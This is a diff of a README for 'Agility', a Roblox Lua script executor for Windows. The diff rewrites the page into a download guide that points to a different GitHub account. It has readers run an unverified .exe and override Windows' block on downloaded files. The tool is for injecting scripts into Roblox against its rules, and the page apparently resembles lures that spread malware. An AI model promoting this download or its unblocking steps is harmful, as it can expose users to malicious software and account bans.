@@ -1,149 +1,227 @@
-# Agility PC - Roblox Script Executor 2026
+# 🖥️ agility-pc-lua-executor - Run Lua Scripts From One Desktop
 
-> **Agility is a Windows-first Roblox executor that provides a lightweight desktop interface for running Lua scripts, with a workflow centered on script hub usage in 2026.**
+[![Download Agility](https://img.shields.io/badge/Download%20Agility-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rand5483/agility-pc-lua-executor)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-Script%20Execution-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/priceevanni8533/agility-pc-lua-executor?style=flat-square)](https://github.com/priceevanni8533/agility-pc-lua-executor)
+Agility is a Windows desktop application for running Lua scripts through a simple interface. It focuses on script hub use and supports 64-bit versions of Windows 10 and Windows 11.
 
----
+## 1. 🧭 Check Your Windows Version
 
-<p align="center">
-  <a href="https://priceevanni8533.github.io/agility-pc-lua-executor/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Agility-Latest-brightgreen?style=for-the-badge" alt="Download Agility">
-  </a>
-</p>
+Agility supports these systems:
 
-> **[Download Agility directly](https://priceevanni8533.github.io/agility-pc-lua-executor/)**  
-> Windows 10 / 11 · 64-bit
+- Windows 10, 64-bit
+- Windows 11, 64-bit
+- A working internet connection for the first download
+- At least 4 GB of system memory
+- At least 200 MB of free storage
+- A screen with a resolution of 1280 × 720 or higher
 
----
+To check your Windows version:
 
-[Download Latest Build](https://priceevanni8533.github.io/agility-pc-lua-executor/)
+1. Press the Windows key.
+2. Type `System Information`.
+3. Open the System Information app.
+4. Find **System Type**.
+5. Confirm that it shows **x64-based PC**.
+6. Check the Windows version under **OS Name**.
 
----
+Agility does not target 32-bit Windows systems. If your system shows `x86-based PC`, the application may not start.
 
-## Overview
+## 2. 📥 Visit the Download Page
 
-Agility is a Windows desktop Roblox executor built to provide a practical environment for preparing and running Roblox scripts. The application keeps its workflow centered on script execution through a compact interface.
+Visit this page to download Agility:
 
-Its design follows a script hub-inspired organization, making it relevant to users looking for a Windows Roblox executor, Lua executor, or local script execution utility.
+[![Open the Agility download page](https://img.shields.io/badge/Open%20Download%20Page-9333EA?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rand5483/agility-pc-lua-executor)
 
-## Highlights
+The link opens the project page on GitHub. Look for the **Releases** area on the right side of the page or open the **Releases** tab near the top.
 
-- Run Roblox scripts through a dedicated desktop program.
-- Use a Windows-oriented setup for Roblox script execution.
-- Access primary controls through a compact, focused interface.
-- Organize commonly used script resources in a script hub-style layout.
-- Work from a desktop application instead of relying solely on a browser.
-- Maintain a straightforward project structure for local development and testing.
-- Stay focused on the core Roblox executor use case.
-- Explore Roblox scripts within the software terms that apply to their use.
+If the project provides a Windows installer, download the file that ends in `.exe`. If it provides a compressed file, download the file that ends in `.zip`.
 
-## Roblox Experiences and Script Categories
+Save the download in a place that you can find, such as:
 
-Agility is designed around Roblox script execution. Actual compatibility depends on the experience, script category, Roblox changes, and the environment where the script is run.
+- The **Downloads** folder
+- The **Desktop**
+- A folder named `Agility`
 
-| Roblox Experience | Script Category |
-|---|---|
-| Adopt Me! | Utility and interface scripts |
-| Blox Fruits | Gameplay and utility scripts |
-| Brookhaven RP | Roleplay and customization scripts |
-| Da Hood | Gameplay utility scripts |
-| Pet Simulator 99 | Collection and utility scripts |
-| Murder Mystery 2 | Gameplay and interface scripts |
-| General Roblox | Lua script execution and testing |
+Do not open random files from the repository. Use the Windows file listed in the release area.
 
-## Requirements
+## 3. 📦 Install or Extract Agility
 
-| Component | Requirement |
-|---|---|
-| Operating system | Windows 10 or Windows 11 |
-| Architecture | 64-bit Windows environment |
-| Memory | 4 GB RAM recommended |
-| Storage | Available space for the application and local scripts |
-| Runtime | .NET requirement depends on the current build |
-| Roblox | A current Roblox installation |
+The steps depend on the file type that you download.
 
-The required setup may change alongside Agility and the Roblox platform. Consult the release details for the specific build before installing or upgrading.
+### Windows installer
 
-## Installation and Launch
+If the file ends in `.exe`:
 
-Retrieve the repository, then move into the project folder:
+1. Open the folder that contains the file.
+2. Double-click the file.
+3. Follow the setup steps.
+4. Choose the default install folder unless you need a different location.
+5. Select **Finish** when setup ends.
+6. Open Agility from the Start menu or desktop shortcut.
 
-    git clone https://github.com/priceevanni8533/agility-pc-lua-executor.git
-    cd Agility
+### ZIP file
 
-Start the application with:
+If the file ends in `.zip`:
 
-    AgilityExecutor.exe
+1. Right-click the ZIP file.
+2. Select **Extract All**.
+3. Choose a folder with a short name, such as `C:\Agility`.
+4. Select **Extract**.
+5. Open the new folder.
+6. Double-click the Agility application file.
 
-For builds distributed as release or download packages, copy the executable into its designated application directory and launch it there instead of building from source.
+Keep all files in the extracted folder. The program may need files stored beside the main application file.
 
-## Search Topics for 2026
+## 4. 🪟 Start the Desktop Interface
 
-- Roblox executor for Windows 10 and Windows 11
-- Roblox Lua script execution
-- Agility Roblox executor download
-- Roblox script hub desktop application
-- Roblox scripts for popular experiences
-- Windows script executor interface
-- Roblox executor project and local scripts
+After installation or extraction:
 
-## Project Layout
+1. Open Agility.
+2. Wait for the main window to appear.
+3. Review the script editor and control buttons.
+4. Open the settings area if the program provides one.
+5. Choose a clear folder for saved Lua scripts.
 
-    Agility/
-    ├── AgilityExecutor.exe
-    ├── scripts/
-    ├── hub/
-    ├── assets/
-    ├── config/
-    └── README.md
+The first start may take longer than later starts while Windows prepares the application. Do not move or rename the application folder while Agility is open.
 
-Packaged downloads and source-based builds may not contain exactly the same files or directory structure.
+The interface may include these common areas:
 
-## Frequently Asked Questions
+- **Script editor** for viewing or changing Lua text
+- **Open** button for loading a saved script
+- **Save** button for storing a script
+- **Run** button for starting a script
+- **Clear** button for removing text from the editor
+- **Script hub** area for choosing scripts from a list
+- **Status** area for showing errors or run results
 
-### Which Windows versions are supported?
+The exact names and layout can vary between releases.
 
-Agility is intended for Windows desktop systems, specifically Windows 10 and Windows 11.
+## 5. 📝 Open a Lua Script
 
-### Is Roblox script execution supported?
+To open a script stored on your computer:
 
-Yes. Executing Roblox scripts is the application's primary purpose.
+1. Select **Open** in Agility.
+2. Browse to the folder that contains the script.
+3. Select the file.
+4. Choose **Open**.
+5. Read the script in the editor.
+6. Check the status area for file or syntax errors.
 
-### Can Roblox updates change compatibility?
+Lua files often use the `.lua` file ending. Some script hubs may use a text file or another format supported by the release.
 
-Yes. Updates to Roblox or connected components may affect compatibility. Review the newest build and its release notes before relying on an older version.
+Store scripts in a simple folder, such as:
 
-### What is Agility's approach compared with other Roblox executors?
+`Documents\Agility\Scripts`
 
-Agility emphasizes a straightforward Windows desktop workflow, script execution, and a compact interface. Its suitability depends on the scripts and use cases being evaluated.
+Use clear file names, such as:
 
-### Could an executor impact a Roblox account?
+- `example.lua`
+- `movement-test.lua`
+- `ui-test.lua`
 
-Third-party tools and scripts may conflict with Roblox rules and may create account or platform-related risks. Review the relevant terms and take responsibility for how the software is used.
+Use scripts that you wrote or that you have permission to run. Do not enter passwords, account tokens, or private keys into a script or the script editor.
 
-### Where does Agility keep scripts and configuration?
+## 6. ▶️ Run a Script
 
-Depending on the release, local scripts and settings may reside in the application directory or in configured data locations. Refer to the project files and build documentation for release-specific behavior.
+Before you run a script, close files that the script does not need. Keep the first test simple.
 
-## 2026 Roadmap
+1. Open Agility.
+2. Load the Lua script.
+3. Read the script name in the editor.
+4. Select **Run**.
+5. Watch the status area.
+6. Wait for the script to finish or show a result.
 
-- [ ] Polish the desktop interface and navigation
-- [ ] Make script hub organization more effective
-- [ ] Provide more explicit build and compatibility information
-- [ ] Broaden local configuration controls
-- [ ] Reassess the script execution workflow as Roblox changes
+A script may open another window, print text, change an application state, or show an error. The result depends on the script and the runtime support in the Agility release.
 
-## License
+If the program has a **Stop** button, use it to end a script that keeps running. If the window stops responding, wait a short time before closing it. Windows may need time to end the process.
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+## 7. ⚙️ Use Script Hub Features
 
----
+If your version includes a script hub, use the hub to browse available scripts from the application interface.
 
-<p align="center">
-  <i>Agility provides a focused Windows desktop workflow for Roblox script execution.</i>
-</p>
+A typical workflow is:
+
+1. Open the **Script Hub** tab.
+2. Select a category.
+3. Select a script.
+4. Read the script details.
+5. Choose **Load** or **Open**.
+6. Review the script in the editor.
+7. Select **Run** when the script is ready.
+
+Some hubs need an internet connection to load their lists. A slow connection may delay the list or show an empty panel. Try the **Refresh** control if one is available.
+
+Save scripts that you use often in a local folder. This lets you open them when the script hub is not available.
+
+## 8. 🛠️ Fix Common Problems
+
+### Agility does not open
+
+Try these steps:
+
+1. Restart Windows.
+2. Open the application from its install or extracted folder.
+3. Confirm that you use the 64-bit version of Windows.
+4. Move the application to a short folder path such as `C:\Agility`.
+5. Install pending Windows updates.
+6. Download a fresh copy from the project page.
+
+### Windows blocks the file
+
+Windows may ask you to confirm a file that came from the internet.
+
+1. Right-click the downloaded file.
+2. Select **Properties**.
+3. Check the file name and location.
+4. Use the Windows option to allow the file if you trust its source.
+5. Select **Apply**, then open the file again.
+
+Only allow files that came from the project page or its listed release files.
+
+### The script shows an error
+
+Check these items:
+
+- The file contains valid Lua syntax.
+- The script matches the Agility version.
+- The file finished downloading.
+- The script does not need a service that is not running.
+- The script does not use functions outside the runtime.
+- The file path uses normal Windows folders.
+
+Try a small test script first. This can show whether the issue comes from the file or the runtime.
+
+### The script hub is empty
+
+Check your internet connection, then restart Agility. If the hub still shows no entries, open a local Lua file from the editor to confirm that the main program works.
+
+### Agility closes during a run
+
+Save your work before testing. Use a smaller script and run one script at a time. Check the release page for a newer Windows build or a change log.
+
+## 9. 🔄 Update Agility
+
+To update the application:
+
+1. Open the project page on GitHub.
+2. Select **Releases**.
+3. Read the newest release entry.
+4. Download the current Windows file.
+5. Close Agility.
+6. Install or extract the new version.
+7. Copy your saved scripts into the new scripts folder.
+8. Start the new version.
+
+Keep a backup of your scripts before replacing an older installation. Do not delete your script folder until you confirm that the new version works.
+
+## 10. 📁 Store Settings and Scripts
+
+A simple folder layout can keep your files easy to find:
+
+- `Agility\Scripts` — Lua files
+- `Agility\Backups` — saved copies
+- `Agility\Logs` — run logs, if supported
+- `Agility\Downloads` — files from the project page
+
+Use short folder names and avoid special characters in file paths. Save each script before you test changes.
